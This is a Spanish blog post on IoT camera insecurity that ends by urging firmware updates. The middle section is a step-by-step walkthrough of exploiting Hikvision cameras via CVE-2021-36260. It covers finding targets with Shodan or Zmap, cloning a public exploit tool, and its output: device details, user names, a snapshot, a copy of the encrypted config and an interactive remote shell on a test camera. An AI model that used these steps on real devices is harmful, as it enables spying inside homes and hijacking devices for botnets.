---
title: Firmware updates
date: 2025-07-30 11:00:00 +0200
categories: [ciberseguridad, redes]
tags: [camaras, shodan, hacking, firmware, iot]     
image:
    path: https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/Firmware_update_Fuji_Instax_Liplay.jpg/500px-Firmware_update_Fuji_Instax_Liplay.jpg1024px-Surface_Web_%26_Deep_Web.jpg
    alt: firmware update
---

## Ciberseguridad de IoT
Quiero dejar evidencia de lo sencillo que puede resultarle a actores maliciosos, obtener información de dispositivos IoT o hackearlos. Estos dispositivos, cámaras, sensores, aspiradoras, neveras, routers, etc, etc y cada vez hay más claro que no todos se conectan a Internet, sino "solamente a la red interna", esto en la mayoría de casos es cierto, pero poco a poco iremos "abriendo más puertos" para tener acceso a estos dispositivos desde Internet o dicho de otra forma, les daremos acceso a "la red" y no los tendremos tan aislados porque nos proporcionan "bienestar". Por ejemplo las cámaras de videovigilancia cada vez son más comunes y que en cierta forma proporcionan seguridad, a su vez el poder usar "la red" para tener acceso a ellas mejora la observabilidad y esto retroalimenta la seguridad. 

## Exploits  
Los actores maliciosos buscan vulnerabilidades para por ejemplo crear una botnet con dispositivos IoT. Cuando encuentran una como esta ya sea investigando ellos mismos o por por terceros, pasan a la siguiente fase. ```CVE-2021-36260``` 

## Dorking y sondas
Ahora que los actores maliciosos conocen las vulnerabilidades, lo que necesitan es encontrar objetivos a los que aplicar las técnicas necesarias para ganar acceso, privilegios y control sobre los mismos. 

Hay varias formas de encontrar estos dispositivos, puedes hacerlo con un script que haga un request aletoriamente por IPs para comprobar si ese puerto es una cam o una marca en concreto, lo que se llama escrapeo, con herramientas escáneres como Zmap capaces de escanear Internet entero en pocos minutos. También puedes usar la opción más dependiente que es usar una API de terceros como [https://www.shodan.io](https://www.shodan.io/), que es la que usé para testear. Otras fórmulas de búsqueda por supuesto. 

![shodan.io](https://upload.wikimedia.org/wikipedia/en/3/38/Shodan_%28website%29_logo.png)

Ahora en el buscador de Shodan introducimos simplemente ```3.1.3.150324``` esta sería la versión de la web vulnerable que nos indican en el exploit, si bien puede que afecte a más productos y por lo tanto a otras versiones de la web. Esto solo es el filtro que hemos aplicado a Shodan.io para el resultado de su motor. Aplicando otros filtros es posible que obtengamos más resultados. 

### Preparación 
``` shell
git clone https://github.com/tamim1089/HikvisionExploiter
python -m venv .
source bin/activate
pip install -r requirements.txt
nano targets.txt #introduces los targets ip:puerto
```

## Explotación

``` shell
python checker.py
=======================================================
Target: 192.168.2.221:81
=======================================================

[+] Directory accessible: http://192.168.2.221:81/onvif-http/snapshot?auth=YWRtaW46MTEK

[+] Device Info
    deviceName: IP CAMERA
    deviceID: 88
    deviceDescription: IPCamera
    deviceLocation: Lugo
    systemContact: Hikvision.China
    model: DS-2CD3T20D-I3
    serialNumber: DS-*********
    macAddress: c4:********
    firmwareVersion: V5.3.1
    firmwareReleasedDate: build 150401
    bootVersion: V1.3.4
    bootReleasedDate: 100316
    hardwareVersion: 0x0

[+] Users
    admin: Administrator
[+] Snapshot saved: logs/192.168.2.221:81_20250730_124156/20250730_124156.jpg

-- CVE-2021-36260 (RCE Command Injection Check) --
    RCE confirmed! Device is VULNERABLE!!!
    Run this to get a shell: chmod +x shell.sh && ./shell.sh 192.168.2.221:81

```

RCE shell, el proyecto viene acompañado de una utilidad para interactuar con el dispositivo a través de Curl 

```shell
(HikvisionExploiter) ┌──(pablo☠office)
└─$ ./shell.sh 192.168.2.221:81
[+] Target 192.168.2.221:81 appears vulnerable!
Connected to Hikvision target: 192.168.2.221:81
Type commands to execute remotely. Ctrl+C to exit.
hikvision-shell> ls
applib
certs
initrun.sh
pidfile
process
r2_isp_config
sound
webLib
```
Si el dispositivo es vulnerable además se generará un carpeta en el directorio logs intentará checkear si el dispostivo es  vulnerable a obtener una shell y además sacará una fotograma de la webcam y una copia del config_enc.bin el proyecto dice que intentará descifrarlo pero no he visto que lo haga, se quedará en un intento o funcionará en algunos modelos y otros no, no parecía funcionar en el que me han prestado para pruebas. 

``` shell
├── 192.168.2.221:81_20250730_124156
│   ├── 20250730_124156.jpg
│   └── config_enc.bin
```

## Firmware updates

Tengo un artículo explicando 14 puntos a tener en cuenta a la hora de securizar un router, en el se habla también de las actualizaciones y del miedo que se tiene a parchear, actualizar, etc este tipo de dispositivos. Solo intenta evaluar lo siguiente: Romper/brikear un dispositivo es algo técnico y puede que cueste dinero y tiempo, que te espíen en tu propia casa es algo personal. 

![webcam guitarrist](https://upload.wikimedia.org/wikipedia/commons/6/69/1975_Alvarez_guitar_%282010-10-18_03.14.15_by_fenderfish%29.jpg)

El de la foto no soy yo pero ejemplifica la situación. 